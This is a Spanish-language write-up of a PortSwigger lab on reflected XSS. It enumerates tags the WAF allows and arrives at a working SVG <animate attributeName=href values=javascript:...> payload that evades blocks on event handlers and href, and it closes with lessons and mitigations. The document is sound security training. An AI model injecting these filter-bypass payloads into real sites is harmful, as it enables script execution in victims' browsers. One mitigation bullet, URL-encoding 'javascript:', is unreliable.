---
title: "Reflected XSS with event handlers and href attributes blocked"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "reflected-xss-with-event-handlers-and-href-attributes-blocked"
author: "Z4k7"
date: "2026-04-29"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Reflected"
  - "SVG"
  - "EventBlocked"
techniques:
  - "SVG Element Abuse"
  - "Attribute Name Manipulation"
  - "Tag Enumeration"
tools:
  - "BurpSuite"
  - "Intruder"
flags_list:
  - label: "alert"
    value: "Ejecutado exitosamente document.domain"
summary: "Laboratorio de XSS Reflejado donde todos los event handlers (onclick, onmouseover, etc.) y atributos href están bloqueados por un WAF. La solución requiere enumerar etiquetas permitidas, identificar que SVG tags como <animate> no están bloqueados, y usar atributos como attributeName combinados con elementos <a> y <text> para crear un vector clickeable que ejecute código sin usar event handlers tradicionales.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad XSS reflejada con algunas etiquetas en la lista blanca, pero todos los eventos y anclajes `href`Los atributos están bloqueados.
          Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte un vector que, al hacer clic, llame a la función. `alert` función.
          Tenga en cuenta que debe etiquetar su vector con la palabra "Click" para inducir al usuario del laboratorio simulado a hacer clic en su vector. Por ejemplo:
          `<a href="">Click me</a>`

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421173455742.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos el comportamiento de la web enviamos una solicitud por medio de search para consultar el comportamiento
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421173541081.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si trato de enviar un Tag basico se bloquea por medio del WAF
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421173738301.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Respuesta del servidor
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          HTTP/2 400 Bad Request
          Content-Type: application/json; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 20
          
          "Tag is not allowed"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El WAF bloquea: - Tags comunes: `<script>`, `<img>`, `<svg>` (algunas versiones) - Atributos de evento: `onclick`, `onmouseover`, `onfocus`, etc. - Atributos de navegación: `href` Necesitamos identificar qué tags SÍ están permitidos usando enumeración sistemática."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          En este caso para poder validar cual es el Tag que permite manipular la web es por medio de consulta una a una cada Tag puedes realizar el siguiente proceso
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421174106722.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Enviamos la anterior solicitud a Intruder
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421174208504.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Adicionamos una instancia para poder ingresar el listado de los Tag
          En este caso nos podemos ayudar de la extensión de XSS Cheatsheet de burpsuite
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/file-20260419192816867.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos contamos con los siguientes Tag
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421175436864.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En este caso validamos primero con la primera Tag para consultar si funciona
      - kind: "code"
        lang: "HTML"
        code: |
          <animate>a<animate>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421175727931.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "HTML"
        code: |
          <image>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421175806238.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "HTML"
        code: |
          <svg>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421175846874.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "HTML"
        code: |
          <title>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421175925261.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si envío este
          `<a href="">Click me</a>`
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421180031214.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos cada una de las características de los Tag
      - kind: "table"
        headers:
          - "Etiqueta"
          - "Eventos principales soportados"
        rows:
          - ["`` `<a></a>` `` **(anchor)**", "Todos los **eventos globales** (`` `onclick` ``, `` `onmouseover` ``, `` `onfocus` ``, `` `onblur` ``, `` `onkeydown` ``, etc.). Además, se usa mucho `` `onclick` `` para interceptar la navegación."]
          - ["`` `<animate></animate>` `` **(SVG animate)**", "No soporta eventos HTML tradicionales. Se controla con **eventos SVG/SMIL** como `` `beginEvent` ``, `` `endEvent` ``, `` `repeatEvent` ``."]
          - ["`` `<image></image>` `` **(SVG image)**", "Soporta **eventos globales de SVG** (`` `onclick` ``, `` `onmouseover` ``, `` `onmouseout` ``, `` `onfocus` ``, `` `onblur` ``). También puede disparar `` `onload` `` cuando la imagen se carga."]
          - ["`` `<svg></svg>` ``", "Soporta **eventos globales** (`` `onclick` ``, `` `onmouseover` ``, `` `onfocus` ``, etc.). Además, puede contener elementos con eventos propios (`` `<animate></animate>` ``, `` `<circle></circle>` ``, `` `<rect></rect>` ``)."]
          - ["`` `<title></title>` ``", "No soporta eventos. Es un elemento puramente descriptivo para el navegador y no interactúa con el usuario."]
      - kind: "note"
        text: |
          Consultando la tabla anterior se valida que podemos combinar `<svg></svg>` con el `<animate></animate>`
          Amos el siguiente código para validar su correcto funcionamiento
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><animate></animate></svg>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421180709382.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si permite aplicar los tag pero no se evidencia la parte de Click Me
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421180755744.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En el código de la web si se ve reflejado pero no en la parte del usuario en este caso de los Tag disponibles tendremos estos
      - kind: "table"
        headers:
          - "Tag"
          - "Uso"
        rows:
          - ["a"]
          - ["animate", "X"]
          - ["image"]
          - ["svg", "X"]
          - ["title"]
      - kind: "note"
        text: |
          El que nos permite interactuar con el Click Me es el `<a>`
          Recordando el paso antes de enviar la solicitud si tratado de enviar el `<a>` esta bloqueada
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><animate><a onclick=alert()>Click Me</a></animate></svg>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421181430848.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          No se permite en este caso la obsion que nos queda es el apartado de animación si también cuanta con el `onclick`
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate onclick=alert()>Click Me</animate></a></svg>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421181657467.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En este caso es un error de mi parte ya que consultando las característica de `<animate>` no permite Eventos directa de HTML
          Consultamos el comportamiento de eventos de `<animate>`
      - kind: "table"
        headers:
          - "Atributo"
          - "Función"
        rows:
          - ["**attributeName**", "Nombre del atributo del elemento que se va a animar (ej. `cx`, `fill`, `width`)."]
          - ["**from**", "Valor inicial de la animación."]
          - ["**to**", "Valor final de la animación."]
          - ["**values**", "Lista de valores separados por `;` para animaciones con múltiples pasos."]
          - ["**dur**", "Duración de la animación (ej. `2s`, `500ms`)."]
          - ["**begin**", "Momento en que empieza la animación (ej. `0s`, `click`, `mouseover`)."]
          - ["**end**", "Momento en que termina la animación."]
          - ["**repeatCount**", "Número de repeticiones (`indefinite` para infinito)."]
          - ["**fill**", "Qué pasa al terminar (`remove` vuelve al estado inicial, `freeze` mantiene el último valor)."]
          - ["**calcMode**", "Método de interpolación (`linear`, `discrete`, `paced`, `spline`)."]
          - ["**keyTimes**", "Lista de tiempos normalizados (0–1) para sincronizar con `values`."]
          - ["**keySplines**", "Curvas de Bézier para animaciones con `calcMode='spline'`."]
      - kind: "note"
        text: |
          Validemos el comportamiento si se aplica el `attributeName`
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate attributeName=x/>Click Me</a></svg>
      - kind: "note"
        text: |
          Este si permite
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421182905241.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si tratamos de asignarle como si fuera un `href`
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate attributeName="href"/>Click Me</a></svg>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421183226273.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Detalles del SVG
      - kind: "table"
        headers:
          - "Categoría"
          - "Ejemplos principales"
        rows:
          - ["Formas básicas", "`` `<circle></circle>` ``, `` `<rect></rect>` ``"]
          - ["Contenedores", "`` `<svg></svg>` ``, `` `<g></g>` ``"]
          - ["Animación", "`` `<animate></animate>` ``, `` `<set></set>` ``"]
          - ["Texto", "`` `<text></text>` ``, `` `<textPath></textPath>` ``"]
          - ["Gradientes", "`` `<linearGradient></linearGradient>` ``, `` `<pattern></pattern>` ``"]
          - ["Filtros", "`` `<feGaussianBlur></feGaussianBlur>` ``, `` `<feDropShadow></feDropShadow>` ``"]
      - kind: "note"
        text: |
          Contamos con el `text` este nos permite asignar texto en el SVG
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate attributeName="href"/><text>Click Me</text></a></svg>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421183226140.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Los detalles del elemento menciona que se debe agregar
      - kind: "table"
        headers:
          - "Attribute"
          - "Description"
        rows:
          - ["x", "The x position of the start of the text. Default is 0"]
          - ["y", "The y position of the start of the text. Default is 0"]
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate attributeName="href"/><text x="5" y="15" fill="red">Click Me</text></a></svg>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421185935886.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El bypass funciona así: 1. SVG tags están permitidos 2. `<a>` en SVG puede tener atributo `href` normalmente 3. El WAF bloquea `href=` explícitamente en HTML 4. Pero `<animate attributeName=href>` no es bloqueado - es un atributo de animación legítimo 5. El navegador interpreta esto como una animación del atributo `href` 6. Si configuramos `values=javascript:alert(1)`, animamos el href a ese valor 7. `<text>` proporciona contenido clickeable 8. Cuando el usuario hace clic en el `<text>`, sigue el href animado 9. El navegador ejecuta `javascript:alert(1)`"

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El payload que evade el WAF es:
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
      - kind: "note"
        text: |
          Desglosando:
      - kind: "bullet"
        text: "<svg> — contenedor SVG (permitido)"
      - kind: "bullet"
        text: "<a> — elemento anchor de SVG (permitido)"
      - kind: "bullet"
        text: "<animate attributeName=href values=javascript:alert(1) /> — anima el atributo href del anchor a javascript:alert(1)"
      - kind: "note"
        text: |
          - `attributeName=href` no es bloqueado porque no es `href=` explícito
          - `values=javascript:alert(1)` establece el valor de la animación
      - kind: "bullet"
        text: "<text x=20 y=20>Click me</text> — texto clickeable dentro del anchor"
      - kind: "note"
        text: |
          Cuando el usuario hace clic:
          1. El navegador interpreta el clic en el `<text>`
          2. Sigue el `href` del anchor parent
          3. El href fue animado a `javascript:alert(1)`
          4. Se ejecuta el JavaScript
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/file-20260421202134332.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es un bypass elegante porque: - No usa event handlers directamente (bloqueados) - No usa `href=` explícitamente (bloqueado) - Usa atributos de animación SVG que parecen legítimos - El WAF no puede diferenciar entre animación legítima e inyección maliciosa - Requiere interacción del usuario (clic) pero no puede evitarse"

  - id: "exploit"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El payload final que se envía es:
      - kind: "code"
        lang: "HTML"
        code: |
          <svg><a><animate attributeName=href values=javascript:alert(document.domain) /><text x=20 y=20>Click me</text></a></svg>
      - kind: "note"
        text: |
          Una vez ejecutado:
          1. SVG se renderiza en la página
          2. Texto "Click me" aparece y es clickeable
          3. Usuario hace clic en el texto
          4. El navegador sigue el href del anchor
          5. Href contiene `javascript:alert(document.domain)`
          6. `alert(document.domain)` se ejecuta

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "alert"
        value: "Ejecutado exitosamente document.domain"

lessons:
  - 'Los tags SVG tienen características diferentes a HTML - `<a>` en SVG funciona diferente'
  - 'Los atributos de animación SVG (`attributeName`, `values`) no están bajo el mismo escrutinio que atributos HTML directos'
  - 'El WAF que bloquea `href=` explícitamente no previene que se anime el atributo'
  - 'Los elementos SVG + HTML se pueden combinar para crear vectores complejos'
  - 'La enumeración sistemática de tags permitidos es efectiva para encontrar bypasses'
  - 'Los `<animate>` tags se pueden usar para modificar atributos sin event handlers'
  - 'Requiere interacción del usuario pero es un vector válido cuando events están bloqueados'
mitigation:
  - 'Bloquear no solo event handlers sino también atributos de animación SVG que modifiquen `href`'
  - 'Validar tags permitidos más estrictamente - no permitir `<animate>` sin restricciones'
  - 'Usar whitelist de atributos permitidos incluyendo atributos SVG'
  - 'Validar valores de animación - rechazar `javascript:` y protocolos peligrosos'
  - 'Usar Content Security Policy con `script-src ''self''` para bloquear `javascript:` URLs'
  - 'Considerar escapar `javascript:` a `%6a%61%76%61%73%63%72%69%70%74%3a`'
  - 'Sanitizar entrada que contenga `<svg>`, `<animate>`, `attributeName`, `values`'
  - 'Usar bibliotecas como DOMPurify que entienden la complejidad de SVG'
---
